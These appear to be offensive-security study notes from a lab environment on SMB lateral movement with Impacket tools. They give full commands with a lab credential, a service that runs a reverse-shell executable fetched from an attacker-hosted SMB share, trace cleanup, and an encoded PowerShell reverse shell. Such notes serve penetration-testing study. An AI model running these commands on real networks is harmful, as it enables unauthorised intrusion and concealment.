To perform SMB-based lateral movement:

- The attacker needs **local administrator privileges** on the target machine.
- **TCP ports 139 and 445** must be open on the target host.
- In some cases, **TCP 135** (used by DCOM/RPC) is also required.

### UAC  
- Local admin privileges are necessary.
- Local admin accounts that are not RID 500 cannot run tools such as PsExec on Windows Vista and later. 
- Domain users with admin rights on a machine can execute tools such as PsExec . 
- RID 500 local admin accounts can utilize tools such as PsExec on machines

### SMB Named Pipes
Named pipes are similar to open TCP ports, where a client can connect to a server listening to a given port. A process registers a named pipe endpoint, and connections through SMB to this endpoint are sent to this process.

[Lateral Movement With Named Pipes < BorderGate](https://www.bordergate.co.uk/lateral-movement-with-named-pipes/)
[Windows NamedPipes 101 + Privilege Escalation | Red Team Notes](https://www.ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)

### Lateral Movement From Linux

### Psexec.py
Creates a remote service by uploading an executable with a random name to the ADMIN$ share on the target Windows machine. It then registers this service via RPC and the Windows Service Control Manager. Once registered, the tool establishes communication through a named pipe, allowing for the execution of commands and retrieval of outputs on the remote system

```
psexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
```

### smbexec.py
- Uses MSRPC and `svcctl` pipe to run commands **without uploading files
- **Used for:** Remote command execution, stealthier than `psexec.py`.
- **Output:** Semi-interactive shell.
```
sexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52
```

### Services.py
It uses interacts with Windows  Serivices using MSRPC .It allows starting, stopping, deleting, reading status, configuring, listing, creating, and modifying services.

```
services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 list
```
- To move laterally with this tool, we can set up a new service, modify an existing one, and define a custom command to get a reverse shell.

**Steps:**

1. Host your payload using `smbserver.py`.
2. Use `services.py` to:
    - Create a new service that points to the payload.
    - Modify an existing service.
3. Start the service to get a shell.
4. Delete the service to clean up.

```
services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"
```

- We can view the configuration of the custom command created using
`config -name <servicename>`

```
services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 config -name 'Service Backdoor'
```
- Before we run the service, we must ensure that the SMB server has the file that will be executed and start netcat listener
- We can now start the service with start -name

```
impacket-services INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor'
```

- we can cover up the traces and delete the service by typing : delete -name servicename

```
services.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'
```
- Alternatively, we use services.py to modify existing services; for example, if we find a service authenticated as a specific user account, we can change the configuration of that service and make it execute our payload.

### atexec.py 
The atexec.py script utilizes the Windows Task Scheduler service, which is accessible through the atsvc SMB pipe. It enables us to remotely append a task to the scheduler, which will execute at the designated timeit's essential to synchronize the clocks on both the attacking and target PCs down to the exact minute.

- Start netcat to catch rev shell
```
atexec.py INLANEFREIGHT/helen:'RedRiot88'@172.20.0.52 "powershell -e ...SNIP...AbwBzAGUAKAApAA=="
```

